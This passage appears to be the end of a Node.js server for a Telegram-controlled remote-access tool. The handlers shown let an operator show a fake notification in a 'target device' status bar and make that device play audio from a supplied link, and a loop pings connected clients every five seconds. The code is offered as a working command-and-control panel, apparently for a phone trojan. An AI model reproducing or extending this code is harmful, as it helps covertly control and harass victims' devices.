            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
